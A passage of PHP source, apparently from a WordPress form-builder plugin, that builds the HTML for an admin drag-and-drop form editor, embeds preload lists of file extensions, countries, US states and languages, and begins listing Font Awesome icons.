															$output .= '</div>';
													$output .= '</div>';
													$output .= '<div class="grid_input_holder col-sm-2">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
													$output .= '</div>';
													$output .= '<div class="grid_input_holder col-sm-2">';
															$output .= '<div class="panel grid-system panel-default">';
																$output .= '<div class="panel-body">';
																$output .= '</div>';
															$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
												$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
															
														$output .= '</div>';
											$output .= '</div>';	
									$output .= '</div>';
								$output .= '</div>';		
						
						
							$output .= ' </div>';
						$output .= ' </div>';
					$output .= ' </div>';



/****************************************************/	
/**MULTISTEP FIELDS *********************************/	
/****************************************************/	
					$output .= '<div class="panel panel-default">';
						$output .= '<div class="panel-heading" role="tab" id="headingMS">';
							$output .= '<h4 class="panel-title">';
								$output .= '<a class="collapsed" role="button" data-toggle="collapse" data-parent="#fields_accordion" href="#collapseMS" aria-expanded="true" aria-controls="collapseMS">';
									$output .= '<span class="fa fa-forward"></span>&nbsp;Multi-Step Fields';
								$output .= '</a>';
							$output .= '</h4>';
						$output .= '</div>';
						$output .= '<div id="collapseMS" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingMS">';
							$output .= '<div class="panel-body">';
//////////STEP
								$output .= '<div class="field form_field custom-fields grid step" style="width:99%">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-warning btn-sm form-control" style=""><i class=" fa fa-fast-forward"></i>&nbsp;&nbsp;<span class="field_title">Add Step</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input-inner" data-svg="demo-input-1">';
												$output .= '<div class="row">';
													$output .= '<div class="col-sm-12">';
														$output .= '<div class="tab-pane grid-system grid-system panel panel-default"><div class="zero-clipboard"><span class="btn-clipboard btn-clipboard-hover">Step&nbsp;<div class="btn btn-default btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div></span></div>';
															$output .= '<div class="panel-body">';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								

//////////NEXT STEP BUTTON								
								$output .= '<div class="field form_field custom-fields submit-button next-button" style="width:33%">';
									$output .= '<div class="draggable_object input-group-sm ">';
										$output .= '<div class="btn btn-warning btn-sm form-control"><i class=" fa fa-step-forward"></i>&nbsp;&nbsp;<span class="field_title">Next Step</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
												
												
													
																$output .= '<div class="input_container align_right">';
																		$output .= '<div class="nex-step the_input_element btn btn-default">Next Step</div>';
																$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';
															$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
														
													
												
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
//////////PREV STEP BUTTON								
								$output .= '<div class="field form_field custom-fields submit-button prev-button" style="width:33%">';
									$output .= '<div class="draggable_object input-group-sm ">';
										$output .= '<div class="btn btn-warning btn-sm form-control"><i class=" fa fa-step-backward"></i>&nbsp;&nbsp;<span class="field_title">Prev Step</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder no-pre-suffix">';
											
													
																$output .= '<div class="input_container align_left">';
																		$output .= '<div class="prev-step the_input_element btn btn-default">Previous Step</div>';
																$output .= '</div>';
														
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
														
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
							$output .= ' </div>';
						$output .= ' </div>';
					$output .= ' </div>';
					




/****************************************************/	
/**UPLOADER FIELDS **********************************/	
/****************************************************/		
					/*$output .= '<div class="panel panel-default">';
						$output .= '<div class="panel-heading" role="tab" id="headingThree">';
							$output .= '<h4 class="panel-title">';
								$output .= '<a class="collapsed" role="button" data-toggle="collapse" data-parent="#fields_accordion" href="#collapseUF" aria-expanded="true" aria-controls="collapseUF">';
									$output .= '<span class="fa fa-cloud-upload"></span>&nbsp;File Uploaders';
								$output .= '</a>';
							$output .= '</h4>';
						$output .= '</div>';
						$output .= '<div id="collapseUF" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">';
							$output .= '<div class="panel-body">';
				
						
							$output .= ' </div>';
						$output .= ' </div>';
					$output .= ' </div>';		*/
					
/****************************************************/	
/**MULTISTEP FIELDS *********************************/	
/****************************************************/	
					$output .= '<div class="panel panel-default">';
						$output .= '<div class="panel-heading" role="tab" id="headingOE">';
							$output .= '<h4 class="panel-title">';
								$output .= '<a class="collapsed" role="button" data-toggle="collapse" data-parent="#fields_accordion" href="#collapseOE" aria-expanded="true" aria-controls="collapseOE">';
									$output .= '<span class="fa fa-code"></span>&nbsp;Other Elements';
								$output .= '</a>';
							$output .= '</h4>';
						$output .= '</div>';
						$output .= '<div id="collapseOE" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOE">';
							$output .= '<div class="panel-body">';	
//PANEL
								$output .= '<div class="field form_field grid other-elements is_panel">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-default btn-sm form-control"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;Panel</div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input-inner" data-svg="demo-input-1">';
												$output .= '<div class="row">';
													$output .= '<div class="input_holder col-sm-12">';
														$output .= '<div class="panel panel-default ">';
															$output .= '<div class="panel-heading">Panel Heading</div>';
															$output .= '<div class="panel-body the-panel-body">';
															$output .= '</div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
										$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
											$output .= '<div class="btn btn-info btn-sm edit"><i class="glyphicon glyphicon-pencil"></i></div>';											
											$output .= '<div class="btn btn-danger btn-sm delete"><i class="glyphicon glyphicon-remove"></i></div>';
										$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
//PARAGRAPH
								$output .= '<div class="field form_field paragraph other-elements">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-default btn-sm form-control"><i class="fa fa-align-justify"></i>&nbsp;&nbsp;<span class="field_title">Paragraph</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												$output .= '<div class="input-inner svg_ready" data-svg="demo-input-1">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12">';
																$output .= '<div class="input-group date svg_ready"><input type="hidden" class="set_math_result" value="0" name="math_result">';
																	$output .= '<p class="the_input_element">Add {math_result} as placeholder for the equation\'s result in the text below. </p><div style="clear:both;"></div>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
						
//HTML
								$output .= '<div class="field form_field paragraph other-elements">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-default btn-sm form-control"><i class="fa fa-code"></i>&nbsp;&nbsp;<span class="field_title">HTML</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												$output .= '<div class="input-inner svg_ready" data-svg="demo-input-1">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12">';
																$output .= '<div class="input-group date svg_ready"><input type="hidden" class="set_math_result" value="0" name="math_result">';
																	$output .= '<p class="the_input_element">Add HTML</p><div style="clear:both;"></div>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
							
//DIVIDER
								$output .= '<div class="field form_field divider other-elements">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-default btn-sm form-control"><i class="fa fa-minus"></i>&nbsp;&nbsp;<span class="field_title">Divider</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												$output .= '<div class="input-inner svg_ready" data-svg="demo-input-1">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12">';
																	$output .= '<hr class="the_input_element" />';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
//H1
								$output .= '<div class="field form_field heading other-elements">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-default btn-sm form-control"><i class="fa fa-header"></i>&nbsp;&nbsp;<span class="field_title">Heading 1</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												$output .= '<div class="input-inner svg_ready" data-svg="demo-input-1">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12">';
																$output .= '<div class="input-group date svg_ready"><input type="hidden" class="set_math_result" value="0" name="math_result">';
																	$output .= '<h1 class="the_input_element">Heading 1</h1>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
//H2	
								$output .= '<div class="field form_field heading other-elements">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-default btn-sm form-control"><i class="fa fa-header"></i>&nbsp;&nbsp;<span class="field_title">Heading 2</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												$output .= '<div class="input-inner svg_ready" data-svg="demo-input-1">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12">';
																$output .= '<div class="input-group date svg_ready"><input type="hidden" class="set_math_result" value="0" name="math_result">';
																	$output .= '<h2 class="the_input_element">Heading 2</h2>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
//H3	
								$output .= '<div class="field form_field heading other-elements">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-default btn-sm form-control"><i class="fa fa-header"></i>&nbsp;&nbsp;<span class="field_title">Heading 3</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												$output .= '<div class="input-inner svg_ready" data-svg="demo-input-1">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12">';
																$output .= '<div class="input-group date svg_ready"><input type="hidden" class="set_math_result" value="0" name="math_result">';
																	$output .= '<h3 class="the_input_element">Heading 3</h3>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
//H4	
								$output .= '<div class="field form_field heading other-elements">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-default btn-sm form-control"><i class="fa fa-header"></i>&nbsp;&nbsp;<span class="field_title">Heading 4</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												$output .= '<div class="input-inner svg_ready" data-svg="demo-input-1">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12">';
																$output .= '<div class="input-group date svg_ready"><input type="hidden" class="set_math_result" value="0" name="math_result">';
																	$output .= '<h4 class="the_input_element">Heading 4</h4>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
								
//H5	
								$output .= '<div class="field form_field heading other-elements">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-default btn-sm form-control"><i class="fa fa-header"></i>&nbsp;&nbsp;<span class="field_title">Heading 5</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												$output .= '<div class="input-inner svg_ready" data-svg="demo-input-1">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12">';
																$output .= '<div class="input-group date svg_ready"><input type="hidden" class="set_math_result" value="0" name="math_result">';
																	$output .= '<h5 class="the_input_element">Heading 5</h5>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
									$output .= '</div>';
								$output .= '</div>';
								
//H6	
								$output .= '<div class="field form_field heading other-elements">';
									$output .= '<div class="draggable_object input-group-sm">';
										$output .= '<div class="btn btn-default btn-sm form-control"><i class="fa fa-header"></i>&nbsp;&nbsp;<span class="field_title">Heading 6</span></div>';
									$output .= '</div>';
									$output .= '<div id="form_object" class="form_object" style="display:none;">';
											$output .= '<div class="input_holder">';
												$output .= '<div class="input-inner svg_ready" data-svg="demo-input-1">';
													$output .= '<div class="row">';
														$output .= '<div class="col-sm-12" id="field_container">';
															$output .= '<div class="row">';
																$output .= '<div class="col-sm-12">';
																$output .= '<div class="input-group date svg_ready"><input type="hidden" class="set_math_result" value="0" name="math_result">';
																	$output .= '<h6 class="the_input_element">Heading 6</h6>';
																	$output .= '</div>';
																$output .= '</div>';
															$output .= '</div>';
														$output .= '</div>';
														$output .= '<div class="field_settings bs-callout bs-callout-info" style="display:none;">';$output .= '<div class="btn btn-default btn-sm move_field"><i class="fa fa-arrows"></i></div>';
															$output .= '<div class="btn btn-info btn-sm edit "   title="Edit Field Attributes"><i class="glyphicon glyphicon-pencil"></i></div>';
															$output .= '<div class="btn btn-danger btn-sm delete " title="Delete field"><i class="glyphicon glyphicon-remove"></i></div>';
														$output .= '</div>';
													$output .= '</div>';
												$output .= '</div>';
											$output .= '</div>';
											
										$output .= '</div>';
									$output .= '</div>';		
												
								$output .= ' </div>';
							$output .= ' </div>';
						$output .= ' </div>';		
													
					$output .= '</div>';			
				

			
		$output .= '</div>';
								
	$output .= '</div>';
//END LEFT COLUMN						
							
							$output .= '<div class="col2">';
						
							
								$output .= '<div class="panel panel-default admin-panel">';
								
									
									
									$output .= '<div class="panel-heading" style="display:none;">';
										$output .= '<span class="btn btn-primary glyphicon glyphicon-hand-down"></span>';
									$output .= '</div>';
									$output .= '<div id="collapseFormsCanvas" class="panel-collapse in" >';
									$output .= '<div class="canvas-mask">';
									$output .= '</div>';
									$output .= '<style type="text/css" class="custom_css"></style>';
									$output .= '<div class="set-form-width">';
										$output .= '<input id="the_form_title" name="set_form_title" value="" data-content="Form title can not be empty" data-placement="bottom" class="form-control" placeholder="Enter form title">';
									$output .= '</div>';
									
									
									
									
								
                                        
										$output .= '<div class="clean_html hidden"></div>';
										$output .= '<div class="admin_html hidden"></div>';
										$output .= '<div class="panel-body panel_view nex-forms-container  bootstro" data-bootstro-title="Form Canvas" data-bootstro-content="This is where you will construct your forms. Drag form elements here or click them to be appended at the end of existing form content." data-bootstro-placement="left" data-bootstro-step="15">
														
													
														</div></div>';
										//.panel-body	
										$output .= '</div>';										
									$output .= '</div>';
								$output .= '</div>';
								
							$output .= '</div>';
						
						
						/*********************** FORM ENTRIES ****************************/
						
				
				
						
						
						
					$output .= '</div>';
				$output .= '</div>';
			
			
			
			
				
				
				
			$output .= '</div>';
			
	
		$output .= '</div>';
	//#nex-forms
	$output .= '</div>';
	
	$output .= '<div class="preload all_extensions">doc
docx
gif
jpg
jpeg
mpg
mpeg
mp3
odt
odp
ods
pdf
png
psd
ppt
pptx
tif
tiff
txt
xls
xlsx</div>';

$output .= '<div class="preload file_extensions">doc
docx
mpg
mpeg
mp3
odt
odp
ods
pdf
ppt
pptx
txt
xls
xlsx</div>';

$output .= '<div class="preload image_extensions">gif
jpg
jpeg
png
psd
tif
tiff</div>';
	
	$output .= '<div class="preload countries">Afghanistan
Albania
Algeria
Andorra
Angola
Antigua and Barbuda
Argentina
Armenia
Aruba
Australia
Austria
Azerbaijan
Bahamas, The
Bahrain
Bangladesh
Barbados
Belarus
Belgium
Belize
Benin
Bhutan
Bolivia
Bosnia and Herzegovina
Botswana
Brazil
Brunei
Bulgaria
Burkina Faso
Burma
Burundi
Cambodia
Cameroon
Canada
Cape Verde
Central African Republic
Chad
Chile
China
Colombia
Comoros
Congo, Democratic Republic of the
Congo, Republic of the
Costa Rica
Cote d\'Ivoire
Croatia
Cuba
Curacao
Cyprus
Czech Republic
Denmark
Djibouti
Dominica
Dominican Republic
East Timor (see Timor-Leste)
Ecuador
Egypt
El Salvador
Equatorial Guinea
Eritrea
Estonia
Ethiopia
Fiji
Finland
France
Gabon
Gambia, The
Georgia
Germany
Ghana
Greece
Grenada
Guatemala
Guinea
Guinea-Bissau
Guyana
Haiti
Holy See
Honduras
Hong Kong
Hungary
Iceland
India
Indonesia
Iran
Iraq
Ireland
Israel
Italy
Jamaica
Japan
Jordan
Kazakhstan
Kenya
Kiribati
Korea, North
Korea, South
Kosovo
Kuwait
Kyrgyzstan
Laos
Latvia
Lebanon
Lesotho
Liberia
Libya
Liechtenstein
Lithuania
Luxembourg
Macau
Macedonia
Madagascar
Malawi
Malaysia
Maldives
Mali
Malta
Marshall Islands
Mauritania
Mauritius
Mexico
Micronesia
Moldova
Monaco
Mongolia
Montenegro
Morocco
Mozambique
Namibia
Nauru
Nepal
Netherlands
Netherlands Antilles
New Zealand
Nicaragua
Niger
Nigeria
North Korea
Norway
Oman
Pakistan
Palau
Palestinian Territories
Panama
Papua New Guinea
Paraguay
Peru
Philippines
Poland
Portugal
Qatar
Romania
Russia
Rwanda
Saint Kitts and Nevis
Saint Lucia
Saint Vincent and the Grenadines
Samoa
San Marino
Sao Tome and Principe
Saudi Arabia
Senegal
Serbia
Seychelles
Sierra Leone
Singapore
Sint Maarten
Slovakia
Slovenia
Solomon Islands
Somalia
South Africa
South Korea
South Sudan
Spain
Sri Lanka
Sudan
Suriname
Swaziland
Sweden
Switzerland
Syria
Taiwan
Tajikistan
Tanzania
Thailand
Timor-Leste
Togo
Tonga
Trinidad and Tobago
Tunisia
Turkey
Turkmenistan
Tuvalu
Uganda
Ukraine
United Arab Emirates
United Kingdom
Uruguay
Uzbekistan
Vanuatu
Venezuela
Vietnam
Yemen
Zambia
Zimbabwe</div>
<div class="preload us-states">Alabama
Alaska
Arizona
Arkansas
California
Colorado
Connecticut
Delaware
Florida
Georgia
Hawaii
Idaho
Illinois
Indiana
Iowa
Kansas
Kentucky
Louisiana
Maine
Maryland
Massachusetts
Michigan
Minnesota
Mississippi
Missouri
Montana
Nebraska
Nevada
New Hampshire
New Jersey
New Mexico
New York
North Carolina
North Dakota
Ohio
Oklahoma
Oregon
Pennsylvania
Rhode Island
South Carolina
South Dakota
Tennessee
Texas
Utah
Virginia
Washington
West Virginia
Wisconsin
Wyoming</div>
<div class="preload languages">Akan
Amharic
Arabic
Assamese
Awadhi
Azerbaijani	
Balochi	
Belarusian
Bengali
Bhojpuri
Burmese
Cantonese
Cebuano
Chewa
Chhattisgarhi
Chittagonian
Czech
Deccan
Dhundhari
Dutch
English
French	
Fula
Gan
German
Greek
Gujarati	
Haitian Creole
Hakka
Haryanvi
Hausa
Hiligaynon	
Hindi
Hmong
Hungarian
Igbo
Ilokano
Italian	
Japanese
Jin
Kannada
Kazakh
Khmer
Kinyarwanda
Kirundi
Konkani
Korean
Kurdish	
Madurese
Magahi
Maithili
Malagasy
Malay/Indonesian
Malayalam	
Mandarin
Marathi
Marwari
Min Bei
Min Dong
Min Nan
Mossi
Nepali
Oriya
Oromo
Pashto
Persian
Polish
Portuguese
Punjabi
Quechua
Romanian
Russian
Saraiki
Serbo-Croatian
Shona
Sindhi
Sinhalese
Somali
Spanish
Sundanese
Swahili
Swedish
Sylheti
Tagalog
Tamil	
Telugu	
Thai
Turkish 	
Ukrainian
Urdu
Uyghur
Uzbek	
Vietnamese
Wu
Xhosa
Xiang
Yoruba
Zhuang
Zulu</div> ';
	
	
	return $output;
	}

	public function show_icons(){
	

$output = '<i class="fa fa-angellist"></i>
<i class="fa fa-area-chart"></i>
<i class="fa fa-at"></i>
<i class="fa fa-bell-slash"></i>
<i class="fa fa-bell-slash-o"></i>
<i class="fa fa-bicycle"></i>
<i class="fa fa-binoculars"></i>
<i class="fa fa-birthday-cake"></i>
<i class="fa fa-bus"></i>
<i class="fa fa-calculator"></i>
<i class="fa fa-cc"></i>
<i class="fa fa-cc-amex"></i>
<i class="fa fa-cc-discover"></i>
<i class="fa fa-cc-mastercard"></i>
<i class="fa fa-cc-paypal"></i>
<i class="fa fa-cc-stripe"></i>
<i class="fa fa-cc-visa"></i>
<i class="fa fa-copyright"></i>
<i class="fa fa-eyedropper"></i>
<i class="fa fa-futbol-o"></i>
<i class="fa fa-google-wallet"></i>
<i class="fa fa-ils"></i>
<i class="fa fa-ioxhost"></i>
<i class="fa fa-lastfm"></i>
<i class="fa fa-lastfm-square"></i>
<i class="fa fa-line-chart"></i>
<i class="fa fa-meanpath"></i>
<i class="fa fa-newspaper-o"></i>
<i class="fa fa-paint-brush"></i>
<i class="fa fa-paypal"></i>
<i class="fa fa-pie-chart"></i>
<i class="fa fa-plug"></i>
<i class="fa fa-shekel"></i>
<i class="fa fa-sheqel"></i>
<i class="fa fa-slideshare"></i>
<i class="fa fa-soccer-ball-o"></i>
<i class="fa fa-toggle-off"></i>
<i class="fa fa-toggle-on"></i>
<i class="fa fa-trash"></i>
<i class="fa fa-tty"></i>
<i class="fa fa-twitch"></i>
<i class="fa fa-wifi"></i>
<i class="fa fa-yelp"></i>
<i class="fa fa-adjust"></i>
<i class="fa fa-anchor"></i>
<i class="fa fa-archive"></i>
<i class="fa fa-area-chart"></i>
<i class="fa fa-arrows"></i>
<i class="fa fa-arrows-h"></i>
<i class="fa fa-arrows-v"></i>
<i class="fa fa-asterisk"></i>
<i class="fa fa-at"></i>
<i class="fa fa-automobile"></i>
<i class="fa fa-ban"></i>
<i class="fa fa-bank"></i>
<i class="fa fa-bar-chart"></i>
<i class="fa fa-bar-chart-o"></i>
<i class="fa fa-barcode"></i>
<i class="fa fa-bars"></i>
<i class="fa fa-beer"></i>
<i class="fa fa-bell"></i>
<i class="fa fa-bell-o"></i>
<i class="fa fa-bell-slash"></i>
<i class="fa fa-bell-slash-o"></i>
<i class="fa fa-bicycle"></i>
<i class="fa fa-binoculars"></i>
<i class="fa fa-birthday-cake"></i>
<i class="fa fa-bolt"></i>
<i class="fa fa-bomb"></i>
<i class="fa fa-book"></i>
<i class="fa fa-bookmark"></i>
<i class="fa fa-bookmark-o"></i>
<i class="fa fa-briefcase"></i>
<i class="fa fa-bug"></i>
<i class="fa fa-building"></i>
<i class="fa fa-building-o"></i>
<i class="fa fa-bullhorn"></i>
<i class="fa fa-bullseye"></i>
<i class="fa fa-bus"></i>
<i class="fa fa-cab"></i>
<i class="fa fa-calculator"></i>
<i class="fa fa-calendar"></i>
<i class="fa fa-calendar-o"></i>
<i class="fa fa-camera"></i>
<i class="fa fa-camera-retro"></i>
<i class="fa fa-car"></i>
<i class="fa fa-caret-square-o-down"></i>
<i class="fa fa-caret-square-o-left"></i>
<i class="fa fa-caret-square-o-right"></i>
<i class="fa fa-caret-square-o-up"></i>
<i class="fa fa-cc"></i>
<i class="fa fa-certificate"></i>
<i class="fa fa-check"></i>
<i class="fa fa-check-circle"></i>
<i class="fa fa-check-circle-o"></i>
<i class="fa fa-check-square"></i>
<i class="fa fa-check-square-o"></i>
<i class="fa fa-child"></i>
<i class="fa fa-circle"></i>
<i class="fa fa-circle-o"></i>
<i class="fa fa-circle-o-notch"></i>
<i class="fa fa-circle-thin"></i>
<i class="fa fa-clock-o"></i>
<i class="fa fa-close"></i>
<i class="fa fa-cloud"></i>
<i class="fa fa-cloud-download"></i>
<i class="fa fa-cloud-upload"></i>
<i class="fa fa-code"></i>
<i class="fa fa-code-fork"></i>
<i class="fa fa-coffee"></i>
<i class="fa fa-cog"></i>
<i class="fa fa-cogs"></i>
<i class="fa fa-comment"></i>
<i class="fa fa-comment-o"></i>
<i class="fa fa-comments"></i>
<i class="fa fa-comments-o"></i>
<i class="fa fa-compass"></i>
<i class="fa fa-copyright"></i>
<i class="fa fa-credit-card"></i>
<i class="fa fa-crop"></i>
<i class="fa fa-crosshairs"></i>
